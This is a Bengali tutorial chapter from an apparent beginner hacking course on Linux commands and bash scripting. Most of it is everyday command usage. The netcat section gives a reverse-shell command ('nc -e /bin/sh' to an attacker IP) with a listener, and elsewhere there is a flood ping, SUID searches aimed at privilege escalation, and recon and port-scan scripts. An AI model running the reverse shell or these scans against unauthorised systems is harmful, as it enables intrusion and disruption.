# অধ্যায় ৯: Linux Commands (Beginner থেকে Advanced)

## সহজ কথায়:
Linux terminal হলো হ্যাকারের magic wand। প্রতিটি command একটি magic spell — আর তুমি wizard!

---

## ৯.১ Navigation Commands (যেখানে চাও সেখানে যাও)

### pwd — কোথায় আছো দেখো
```bash
# কোথায় আছো?
pwd
# Output: /home/kali
```

### ls — কী কী আছে দেখো
```bash
ls                              # ফাইল ও folder list
ls -l                           # বিস্তারিত (permission, size, date)
ls -a                           # hidden file দেখাও (. দিয়ে শুরু)
ls -la                          # সবকিছু বিস্তারিত
ls -lh                          # size human-readable (KB, MB)
ls /var/log                     # নির্দিষ্ট path
```

### cd — যেখানে যেতে চাও
```bash
cd /var/log                     # সরাসরি path
cd ..                           # এক level উপরে
cd /home/kali/Documents         # path দিয়ে
cd ~                            # home-এ ফিরে যাও
cd -                            # আগের directory-তে ফিরে যাও
```

### mkdir — নতুন folder তৈরি
```bash
mkdir myfolder                  # একটা folder
mkdir -p a/b/c                  # একসাথে nested folder (parent auto)
```

### rmdir / rm — মুছে ফেলা
```bash
rmdir emptyfolder               # শুধু empty folder মুছে
rm file.txt                     # file মুছে
rm -r myfolder                  # folder + সব content মুছে
rm -rf myfolder                 # forcefully সব মুছে (সাবধান!)
```

---

## ৯.২ File Operations (ফাইল নিয়ে খেলা)

### cat — ফাইল দেখা
```bash
cat /etc/passwd                 # পুরো file দেখাও
cat -n file.txt                 # line number সহ
cat file1.txt file2.txt         # একাধিক file concatenate
```

### more / less — বড় file পড়া
```bash
less /var/log/syslog            # scroll করে পড়া (space=next, q=quit)
more /var/log/syslog            # basic pager
```
*less বেশি powerful — up/down arrow, search (/keyword)*

### head / tail — শুরু/শেষ দেখা
```bash
head -n 20 file.txt             # প্রথম ২০ line
tail -n 50 file.txt             # শেষ ৫০ line
tail -f /var/log/syslog         # live follow (নতুন log দেখাবে)
```

### nano / vim — এডিটর
```bash
nano file.txt                   # সহজ editor (Ctrl+O save, Ctrl+X exit)
vim file.txt                    # advanced editor (i=insert, :wq=save quit)
```

### cp — কপি করা
```bash
cp source.txt dest.txt          # file কপি
cp -r source_folder dest        # folder কপি (recursive)
cp *.txt /tmp/                  # সব txt file /tmp-এ কপি
```

### mv — মুভ করা / নাম বদলানো
```bash
mv oldname.txt newname.txt      # rename
mv file.txt /tmp/               # move to folder
mv /tmp/file.txt ./             # move to current (.) folder
```

### find — খোঁজা
```bash
find / -name "*.txt"            # সব txt file খুঁজো
find /home -type f -name "*.conf"   # config file খুঁজো
find / -perm -4000              # SUID file খুঁজো (privilege escalation) ⭐
find / -size +100M              # 100MB+ file খুঁজো
```

### grep — content খোঁজা
```bash
grep "root" /etc/passwd         # "root" keyword খুঁজো
grep -i "error" /var/log/syslog # case-insensitive search
grep -r "password" /etc/        # recursive search
grep -v "comment" file.txt      # exclude ("comment" ছাড়া সব)
```

### chmod — permission বদলানো
```bash
chmod 755 script.sh             # rwxr-xr-x (owner=all, group=read/exec, other=read/exec)
chmod +x script.sh              # executable বানাও
chmod -R 644 folder/            # recursive সব file
```

**Permission বুঝো:**
```
r = 4 (read)
w = 2 (write)
x = 1 (execute)

rwx = 4+2+1 = 7
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4
```

### chown — owner বদলানো
```bash
chown kali:root file.txt        # owner=kali, group=root
chown -R kali:kali /home/kali/  # recursive
```

---

## ৯.৩ Network Commands (Hacker-দের জন্য সবচেয়ে গুরুত্বপূর্ণ)

### Ping — alive check
```bash
ping google.com                 # infinite ping (Ctrl+C stop)
ping -c 4 google.com            # ৪ বার ping
ping -f google.com              # flood ping (ডিনায়েল) — সাবধান!
```

### IP address / ifconfig
```bash
ip a                            # সব network interface দেখো (আধুনিক)
ip addr show eth0               # specific interface
ip route                        # routing table দেখো

ifconfig                        # পুরনো কিন্তু কাজ করে
ifconfig eth0 192.168.1.100/24  # static IP set
```

### netstat / ss — connection দেখো
```bash
ss -tln                         # TCP listening port
ss -uln                         # UDP listening port
ss -tup                         # সব TCP + process
netstat -an                     # সব connection
netstat -rn                     # routing table
```

### curl — HTTP request পাঠাও
```bash
curl https://api.example.com    # GET request
curl -X POST -d "user=admin" https://example.com/login  # POST
curl -v https://google.com      # verbose (header দেখাবে)
curl -o file.html https://site.com  # save to file
curl -x http://proxy:8080 https://site.com  # proxy ব্যবহার
```

### wget — ফাইল ডাউনলোড
```bash
wget https://example.com/file.zip    # download
wget -r https://site.com             # recursive download (whole site)
wget -c https://bigfile.iso          # resume download
```

### nc (netcat) — network Swiss Army knife ⭐
```bash
# Port scan
nc -zv 192.168.1.10 22-100     # port 22-100 scan

# Banner grab
nc -v 192.168.1.10 80          # HTTP banner দেখো

# Reverse shell (target এ):
nc -e /bin/sh 192.168.1.5 4444  # target → তোমার PC-তে shell দাও

# তোমার PC-তে listener:
nc -lvnp 4444                   # listen on port 4444
```

---

## ৯.৪ Process Management

```bash
ps aux                          # সব process দেখো
ps aux | grep firefox           # Firefox-এর process খুঁজো
top                             # live process monitor (q=quit)
htop                            # better than top (রঙিন, interactive)

kill 1234                       # process ID 1234 kill
kill -9 1234                    # forcefully kill (SIGKILL)
killall firefox                 # সব firefox process kill

nohup command &                 # background-এ চালাও (logout-এও চলে)
jobs                            # background job list
fg %1                           # job 1 কে foreground-এ আনা
```

---

## ৯.৫ User Management

```bash
whoami                          # current user
id                              # UID, GID, groups

adduser newuser                 # নতুন user বানাও
passwd newuser                  # password set/change
userdel -r newuser              # user + home delete

sudo apt update                 # root permission-এ command
su - kali                       # switch user

# user group management:
usermod -aG sudo kali           # kali কে sudo group-এ add
groups kali                     # kali-র group list
```

---

## ৯.৬ Service Management (Systemd)

```bash
systemctl start ssh              # SSH service চালু
systemctl stop apache2           # Apache বন্ধ
systemctl restart nginx          # Nginx restart
systemctl status mysql           # MySQL status দেখো
systemctl enable ssh             # boot-এ auto start
systemctl disable ssh            # boot-এ auto start বন্ধ
systemctl list-units --type=service  # সব service
```

---

## ৯.৭ File Compression & Archive

```bash
tar -cvf archive.tar folder/     # tar archive বানাও
tar -xvf archive.tar             # tar extract
tar -czvf archive.tar.gz folder/ # tar + gzip compress
tar -xzvf archive.tar.gz         # gzip extract

zip archive.zip file.txt         # zip বানাও
unzip archive.zip                # unzip

gzip file.txt                    # compress (file.txt.gz হয়)
gunzip file.txt.gz               # decompress
```

---

## ৯.৮ Bash Scripting (Hacker-এর নিজের tool বানানো)

### Bash Script Basics:

```bash
#!/bin/bash
# এই scripting হ্যাকারদের জন্য - নিজের auto tool বানাও

# Variables
name="Kali"
echo "Hello $name"

# User input
read -p "Enter target IP: " ip
echo "Scanning $ip..."

# Conditions
if [ "$ip" == "192.168.1.1" ]; then
    echo "This is the router!"
elif [ -z "$ip" ]; then
    echo "No IP entered!"
else
    echo "Scanning target..."
fi

# Loop — port scan
echo "Scanning common ports..."
for port in 22 80 443 3306 8080; do
    (echo >/dev/tcp/$ip/$port) 2>/dev/null && \
    echo "Port $port is OPEN" || \
    echo "Port $port is CLOSED"
done

# Function
scan_port() {
    local target=$1
    local port=$2
    timeout 2 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "✅ Port $port — OPEN"
    else
        echo "❌ Port $port — CLOSED"
    fi
}

# Function call
scan_port $ip 80
scan_port $ip 443

# While loop (continuous)
echo "Starting continuous monitoring (Ctrl+C to stop)..."
while true; do
    ping -c 1 $ip > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[$(date)] $ip is UP"
    else
        echo "[$(date)] $ip is DOWN"
    fi
    sleep 5
done
```

### Hacker's Recon Script:

```bash
#!/bin/bash
# 🤫 নিজের reconnaissance tool
# ব্যবহার: ./recon.sh target.com

target=$1
output_dir="recon_$target"

echo "=================================="
echo "🥷 Starting Recon on: $target"
echo "=================================="

# Output directory তৈরি
mkdir -p $output_dir

echo "[+] DNS Information..."
host $target | tee $output_dir/dns.txt

echo "[+] WHOIS Lookup..."
whois $target | head -20 | tee $output_dir/whois.txt

echo "[+] Port Scanning (Common)..."
for port in 21 22 23 25 53 80 110 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 8080 8443; do
    timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "  ✅ Port $port — OPEN" | tee -a $output_dir/ports.txt
    fi
done

echo "[+] HTTP Header Grab..."
curl -sI http://$target | tee $output_dir/http_headers.txt

echo "[+] Subdomain Search (basic)..."
for sub in www mail admin ftp dev test api blog shop; do
    host "$sub.$target" 2>/dev/null | grep "has address" | \
    while read line; do
        echo "  Found: $sub.$target -> $line" | tee -a $output_dir/subdomains.txt
    done
done

echo "✅ Recon Complete! Check $output_dir/"
ls -la $output_dir/
```

**Run করতে:**
```bash
chmod +x recon.sh   # executable বানাও
./recon.sh google.com  # run
```

---

## ৯.9 Useful One-liners (হ্যাকারদের জন্য)

```bash
# Open port check — no nmap
for p in 22 80 443; do timeout 1 bash -c "echo >/dev/tcp/192.168.1.10/$p" 2>/dev/null && echo "Port $p open"; done

# Live network traffic দেখো
tcpdump -i eth0 -n

# সব listening service
ss -tulpn

# সব SUID binary খুঁজো (privilege escalation)
find / -perm -4000 2>/dev/null

# সব world writable file
find / -perm -o+w -type f 2>/dev/null

# Recent log entries
tail -100 /var/log/syslog | grep "error\|fail\|denied"

# File size
du -sh /var/log/*

# Disk usage
df -h

# Memory
free -h

# System info
uname -a
cat /etc/os-release
```

---

## 💡 ল্যাব এক্সারসাইজ

```
১. তোমার Linux (বা WSL) এ প্রতিটি command practice করো

২. একটি bash script লিখো:
   - target IP input নেবে
   - ping test করবে
   - common port scan করবে
   - open port report দেবে

৩. নিচের কাজগুলো করো:
   a) /tmp-এ একটা directory বানাও
   b) তাতে ১০টা file তৈরি করো (touch file{1..10}.txt)
   c) সব *.txt file /tmp-এ move করো
   d) 5 নং file delete করো
   e) বাকি file-এ "hello" লেখো
   f) "hello" যুক্ত file grep করো
```

---

## 📌 মনে রাখো

| Category | Key Commands |
|----------|-------------|
| **Navigation** | `ls`, `cd`, `pwd`, `find` |
| **File Ops** | `cat`, `nano`, `cp`, `mv`, `rm`, `chmod` |
| **Network** | `ip a`, `ping`, `ss`, `curl`, `nc` |
| **Process** | `ps`, `top`, `kill`, `htop` |
| **User** | `whoami`, `sudo`, `adduser`, `passwd` |
| **System** | `systemctl`, `df`, `free`, `uname` |
| **Scripting** | `for`, `if`, `while`, `function`, `variable` |

**পরবর্তী অধ্যায় — Kali Linux Setup ও প্রথম ব্যবহার! 🐉**
